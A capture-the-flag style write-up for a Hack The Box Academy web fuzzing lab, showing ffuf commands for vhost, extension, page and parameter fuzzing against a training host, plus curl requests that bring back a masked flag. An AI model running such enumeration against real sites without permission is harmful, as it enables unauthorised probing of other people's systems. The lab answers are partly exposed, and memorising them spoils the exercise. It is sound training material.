# Brief

You are given an online academy's IP address but have no further information about their website. 

As the first step of conducting a Penetration Test, you are expected to locate all pages and domains linked to their IP to enumerate the IP and domains properly.

Finally, you should do some fuzzing on pages you identify to see if any of them has any parameters that can be interacted with. If you do find active parameters, see if you can retrieve any data from them.

<br>

# Questions

> Target: 83.136.253.59:41929


1.  Run a sub-domain/vhost fuzzing scan on `*.academy.htb` for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)
<br>
<br>

```sh
# Add IP to hosts file
83.136.253.59 academy.htb


# Subdomains?
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb:41929/


# Nope! Vhosts? Get the filtering size
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:41929/ -H 'Host: FUZZ.academy.htb'

cpanel    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 147ms]
ns2       [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 146ms]
...


# Fuzz
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:41929/ -H 'Host: FUZZ.academy.htb' -ic -fs 985


******       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 146ms]
******          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2535ms]
******       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 146ms]


# Add them to hosts file
cat /etc/hosts

83.136.253.59 academy.htb
83.136.253.59 ******.academy.htb
83.136.253.59 ******.academy.htb
83.136.253.59 ******.academy.htb
```


<br>
<br>
2. Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?
<br>
<br>

```sh
# Any directories? ******?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/FUZZ -ic

courses   [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 146ms]


# ******?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/FUZZ -ic


# Nope! ******?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/FUZZ -ic

courses    [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 150ms]


# Extensions. ******?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://******.academy.htb:41929/courses/indexFUZZ

.******   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 3413ms]
.******    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3413ms]


# ******?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://******.academy.htb:41929/indexFUZZ

.******   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 4608ms]
.******    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4615ms]


# Faculty
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://******.academy.htb:41929/courses/indexFUZZ

.******      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 147ms]
.******      [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 147ms]
.******       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3382ms]
```

<br>
<br>
3. One of the pages you will identify should say 'You don't have access!'. What is the full page URL?
<br>
<br>

```sh
# Page fuzzing. Archive?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/courses/FUZZ -recursion -recursion-depth 3 -e .******,.******,.****** -v -ic

index.****** [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 146ms]
.******       [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 146ms]
...


# Looks like we need to filter the size
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/courses/FUZZ -recursion -recursion-depth 3 -e .******,.******,.****** -ic -fs 287


index.******      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 150ms]


# Faculty?
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/courses/FUZZ -recursion -recursion-depth 3 -e .******,.******,.****** -ic


index.****** [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 146ms]
.******       [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 146ms]



# Looks like we need to filter the size here too
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/courses/FUZZ -recursion -recursion-depth 3 -e .******,.******,.****** -ic -fs 287


index.******     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 146ms]
index.******     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1198ms]
******-******.******     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 148ms]


# Access the pages
http://******.academy.htb:41929/courses/index.php7 # Nothing
http://******.academy.htb:41929/courses/index.php  # Nothing
http://******.academy.htb:41929/courses/******-******.****** # Bad boy

http://******.83.136.253.59:41929/courses/******-******.****** # Nope

# All the responses were refused. I googled the forum and landed on
http://faculty.academy.htb:PORT/courses/******-******.******

# ******
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/FUZZ -recursion -recursion-depth 3 -e .******,.******,.****** -ic

images.******    [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 146ms]
download.******           [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 146ms]
...

# Different response size. Filter and fuzz
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://******.academy.htb:41929/FUZZ -recursion -recursion-depth 3 -e .******,.******,.****** -ic -fs 284

index.******               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 151ms]
```

<br>
4. In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?
<br>
<br>

```sh
# Parameters fuzzing. Find the filtering size
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://******.academy.htb:41929/courses/******-******.******?FUZZ=key 

3      [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 147ms]
14     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 147ms]
...


# Fuzz GET
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://******.academy.htb:41929/courses/******-******.******?FUZZ=key -fs 774

******      [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 150ms]



# fuzz POST. Get filtering size
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://******.academy.htb:41929/courses/******-******.****** -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'

ALL       [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 146ms]
2         [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 146ms]



# Same as GET. Fuzz!
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://******.academy.htb:41929/courses/******-******.****** -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774

******      [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 150ms]
******  [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 150ms]
```

<br>
5. Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?
<br>
<br>

```sh
# Had to reset the target and update the hosts file
94.237.61.242:33459

94.237.61.242 academy.htb
94.237.61.242 archive.academy.htb
94.237.61.242 test.academy.htb
94.237.61.242 faculty.academy.htb


# Are users numeric or alphabetical? Try curling
curl http://******.academy.htb:33459/courses/******-******.****** -X POST -d 'user=1' -H 'Content-Type: application/x-www-form-urlencoded'

<div class='center'><p>This method is no longer used.</p></div>
...

# Try get?
curl http://******.academy.htb:33459/courses/******-******.******?user=1

<div class='center'><p>This method is no longer used.</p></div>


# What do you mean? ****** then? POST
curl http://faculty.academy.htb:33459/courses/******-******.****** -X POST -d '******=1' -H 'Content-Type: application/x-www-form-urlencoded'

<div class='center'><p>This user does not have access!</p></div>


# GET
curl http://******.academy.htb:33459/courses/******-******.******?******=1

<div class='center'><p>You don\'t have access!</p></div>


# Hum! Subtle differences. Is it important? Let's create a wordlist of numerical parameters
for i in $(seq 1 1000); do echo $i >> ids.txt; done


# Filter size
ffuf -w ids.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.****** -X POST -d '******=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'

8        [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 146ms]
7        [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 146ms]


# Fuzz POST
ffuf -w ids.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.****** -X POST -d '******=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781


# Nothing. Fuzz GET? Get filter size
ffuf -w ids.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.******?******=FUZZ -fs 774

94                      [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 150ms]
95                      [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 150ms]


# Same as above. Fuzz
ffuf -w ids.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.******?******=FUZZ -fs 774


# Nothing. Increase the number and try again
for i in $(seq 1000 1000000); do echo $i >> ids.txt; done

wc -l ids.txt 
999001 ids.txt


# Try again POST
ffuf -w ids.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.****** -X POST -d '******=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781


# Niente! GET?
ffuf -w ids.txt:FUZZ -u http://faculty.academy.htb:33459/courses/linux-security.php7?******=FUZZ -fs 774


# Nope. Change wordlist
ffuf -w /opt/useful/seclists/Usernames/top-usernames-shortlist.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.****** -X POST -d '******=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781


# Nothing. GET?
ffuf -w /opt/useful/seclists/Usernames/top-usernames-shortlist.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.******?******=FUZZ -fs 774


# Nope. Change WL again. GET
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames-dup.txt:FUZZ -u http://******.academy.htb:33459/courses/******-******.******?******=FUZZ -fs 774


# POST? Filesize remained the same
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames-dup.txt:FUZZ -u http://faculty.academy.htb:33459/courses/******-******.****** -X POST -d '******=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781


*****    [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 146ms]
*****    [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 150ms]


# We have a user within the first 10s. Curl
curl http://******.academy.htb:33459/courses/******-******.****** -X POST -d '******=*****' -H 'Content-Type: application/x-www-form-urlencoded'

<div class='center'><p>HTB{******}</p></div>
...
```



# Resources

- [Forum](https://forum.hackthebox.com/t/help-attacking-web-applications-with-ffuf/4026/6) (consulted on 06/30/2025)
